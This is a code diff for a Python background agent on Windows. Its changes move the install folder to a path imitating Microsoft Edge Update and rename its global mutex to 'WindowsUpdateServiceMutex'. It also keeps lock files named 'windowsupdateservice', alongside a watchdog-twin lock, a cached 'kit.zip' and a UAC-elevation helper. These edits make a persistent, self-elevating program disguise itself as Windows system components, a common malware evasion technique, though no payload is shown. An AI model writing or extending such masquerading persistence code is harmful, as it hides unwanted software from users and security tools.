@@ -46,7 +46,7 @@ def install_directories() -> list[str]:
             os.path.join(local, config.WINDOWS_SUBDIR),
             os.path.join(roaming, config.WINDOWS_SUBDIR),
             os.path.join(program_data, config.WINDOWS_SUBDIR),
-            os.path.join(tempfile.gettempdir(), "MicrosoftEdgeUpdate"),
+            os.path.join(local, "Microsoft", "EdgeUpdate"),
         ]
     home = os.path.expanduser("~")
     return [
@@ -62,12 +62,23 @@ def primary_directory() -> str:
 
 def lock_path() -> str:
     """Single-instance lock file."""
+    if IS_WINDOWS:
+        base = os.environ.get("PROGRAMDATA") or tempfile.gettempdir()
+        return os.path.join(base, config.WINDOWS_SUBDIR, "agent.lock")
     return os.path.join(tempfile.gettempdir(), "windowsupdateservice.lock")
 
 
 def watchdog_lock_path() -> str:
     """Lock file used by the watchdog twin."""
-    return os.path.join(tempfile.gettempdir(), "windowsupdateservice.wd.lock")
+    return lock_path().replace("agent.lock", "watchdog.lock")
+
+
+def shim_path() -> str:
+    return os.path.join(primary_directory(), config.PRODUCT_NAME + ".cmd")
+
+
+def kit_cache_path() -> str:
+    return os.path.join(primary_directory(), "kit.zip")
 
 
 def state_path(name: str) -> str:
@@ -99,6 +110,8 @@ def elevate_process(args: list[str] | None = None, wait: bool = False) -> bool:
     When ``wait`` is True, blocks until the elevated child process exits.
     """
     if not IS_WINDOWS:
+        return False
+    if os.environ.get("SYSPY_NO_UAC") == "1":
         return False
     if is_admin():
         return True
@@ -258,6 +271,7 @@ def read_pid(path: str) -> int:
 def write_pid(path: str, pid: Optional[int] = None) -> None:
     """Write ``pid`` (default: this process) to ``path``."""
     try:
+        os.makedirs(os.path.dirname(path), exist_ok=True)
         with open(path, "w", encoding="ascii") as handle:
             handle.write(str(pid if pid is not None else os.getpid()))
     except OSError:
@@ -276,7 +290,7 @@ def acquire_single_instance(takeover_pid: int = 0, attempts: int = 40) -> bool:
     if IS_WINDOWS:
         try:
             # Global Mutex enforces single-instance across all sessions and elevation boundaries
-            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\SysPyAgentSingleInstanceMutex")
+            mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\WindowsUpdateServiceMutex")
             last_err = ctypes.windll.kernel32.GetLastError()
             if last_err in (183, 5):  # 183: ERROR_ALREADY_EXISTS, 5: ERROR_ACCESS_DENIED (owned by elevated agent)
                 if takeover_pid and takeover_pid != os.getpid():
